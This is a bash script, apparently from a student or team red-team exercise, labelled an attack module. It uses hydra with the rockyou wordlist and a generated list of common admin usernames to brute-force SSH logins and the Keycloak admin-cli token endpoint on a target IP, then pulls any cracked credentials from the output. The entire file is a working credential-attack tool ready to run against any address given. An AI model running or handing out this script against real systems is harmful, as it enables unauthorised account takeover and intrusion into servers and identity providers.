#!/bin/bash
# =============================================================
# M3 — ChainBreaker Attack Module
# Script : hydra_attack.sh
# Purpose: Credential brute-force against SSH and Keycloak
#          HTTP login form using hydra
# Author : Member 3 — Attacker
# Usage  : chmod +x hydra_attack.sh && ./hydra_attack.sh
# =============================================================

set -euo pipefail

TARGET_IP="${1:-192.168.1.100}"
OUTPUT_DIR="./hydra_results"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
USERLIST="./wordlists/users.txt"
PASSLIST="/usr/share/wordlists/rockyou.txt"
THREADS=4

echo "============================================="
echo "  ChainBreaker — Hydra Brute Force [M3]"
echo "  Target : $TARGET_IP"
echo "  Users  : $USERLIST"
echo "  Passes : $PASSLIST"
echo "============================================="

mkdir -p "$OUTPUT_DIR"
mkdir -p "./wordlists"

# ── Generate default user list if not present ──────────────────
if [ ! -f "$USERLIST" ]; then
  echo "[*] Generating default users.txt..."
  cat > "$USERLIST" <<EOF
admin
administrator
root
keycloak
user
test
manager
operator
guest
service
EOF
  echo "[+] users.txt created with $(wc -l < "$USERLIST") entries"
fi

# ── PHASE 1: SSH Brute Force ──────────────────────────────────
echo ""
echo "[1/2] Brute forcing SSH on $TARGET_IP:22 ..."
hydra -L "$USERLIST" \
      -P "$PASSLIST" \
      -t "$THREADS" \
      -vV \
      -f \
      -o "$OUTPUT_DIR/ssh_results_${TIMESTAMP}.txt" \
      "$TARGET_IP" ssh \
      2>&1 | tee "$OUTPUT_DIR/ssh_log_${TIMESTAMP}.txt" || true

echo "[+] SSH results → $OUTPUT_DIR/ssh_results_${TIMESTAMP}.txt"

# ── PHASE 2: Keycloak HTTP Form Brute Force ───────────────────
echo ""
echo "[2/2] Brute forcing Keycloak login on $TARGET_IP:8080 ..."

KEYCLOAK_URL="http://$TARGET_IP:8080"
KEYCLOAK_FORM="/auth/realms/master/protocol/openid-connect/token"
KEYCLOAK_BODY="username=^USER^&password=^PASS^&grant_type=password&client_id=admin-cli"
KEYCLOAK_FAIL="error"

hydra -L "$USERLIST" \
      -P "$PASSLIST" \
      -t "$THREADS" \
      -vV \
      -f \
      -o "$OUTPUT_DIR/keycloak_results_${TIMESTAMP}.txt" \
      "$TARGET_IP" \
      http-post-form \
      "${KEYCLOAK_FORM}:${KEYCLOAK_BODY}:${KEYCLOAK_FAIL}" \
      2>&1 | tee "$OUTPUT_DIR/keycloak_log_${TIMESTAMP}.txt" || true

echo "[+] Keycloak results → $OUTPUT_DIR/keycloak_results_${TIMESTAMP}.txt"

# ── Summary ───────────────────────────────────────────────────
echo ""
echo "============================================="
echo " [DONE] Hydra attack complete."
echo ""
echo " Checking for valid credentials found..."
grep -h "login:" "$OUTPUT_DIR/"*_results_*.txt 2>/dev/null || echo " No credentials found yet."
echo "============================================="
